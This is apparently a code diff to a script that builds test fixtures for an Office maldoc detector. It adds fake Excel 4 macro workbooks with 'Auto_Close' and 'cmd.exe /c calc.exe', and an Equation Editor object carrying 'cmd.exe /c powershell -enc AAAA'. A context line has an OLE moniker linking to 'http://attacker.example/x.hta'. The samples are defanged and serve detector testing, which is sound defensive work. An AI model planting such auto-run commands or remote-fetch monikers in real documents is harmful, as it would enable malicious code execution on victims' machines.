@@ -972,11 +972,18 @@ def main() -> None:
                 + struct.pack("<HH", 0x000A, 0))
     write(R / "office_rt2_xlm_auto_close.xls", cfb({"Workbook": xls_book(b"Auto_Close\x00cmd.exe /c calc.exe\x00")}))
     write(R / "office_rt2_xlm_visible_quiet.xls", cfb({"Workbook": xls_book(b"Total\x00Subtotal\x00")}))
+    write(R / "office_rt2_xlm_cmd_only.xls", cfb({"Workbook": xls_book(b"cmd.exe /c calc.exe\x00")}))
+    write(R / "office_rt2_xlm_autoclose_only.xls", cfb({"Workbook": xls_book(b"Auto_Close\x00")}))
     write(R / "office_rt2_equation_renamed_stream.doc", cfb(
         {"WordDocument": b"\xec\xa5\xc1\x00" + b"\x00" * 60,
          "ObjectPool": {"_1": {"Equation Native2": b"\x1c\x00\x00\x00\x02\x00\x01\x02\x03\x04" + b"cmd.exe /c powershell -enc AAAA" + b"\x00" * 40,
                                "\x01CompObj": b"Microsoft Equation 3.0\x00"}}},
         clsids={("ObjectPool", "_1"): EQUATION_CLSID}))
+    # recognised by CompObj alone (no CLSID), payload in a stream with another name
+    write(R / "office_rt2_equation_compobj_only.doc", cfb(
+        {"WordDocument": b"\xec\xa5\xc1\x00" + b"\x00" * 60,
+         "ObjectPool": {"_1": {"Data2": b"\x1c\x00\x00\x00\x02\x00\x01\x02\x03\x04" + b"cmd.exe /c powershell -enc AAAA" + b"\x00" * 40,
+                               "\x01CompObj": b"Microsoft Equation 3.0\x00"}}}))
     write(R / "office_rt2_ole_moniker_padded.doc", cfb({"WordDocument": b"\xec\xa5\xc1\x00" + b"\x00" * 60,
         "ObjectPool": {"_1": {"\x01Ole": moniker_stream("http://attacker.example/x.hta") + b"\x00" * 70000, "\x01CompObj": b"\x01\x00\xfe\xff" + b"OLE2Link\x00" * 2}}}))
     # RTF: a control word that does nothing, a hex escape inside the keyword, an INCLUDEPICTURE field, and a raw byte
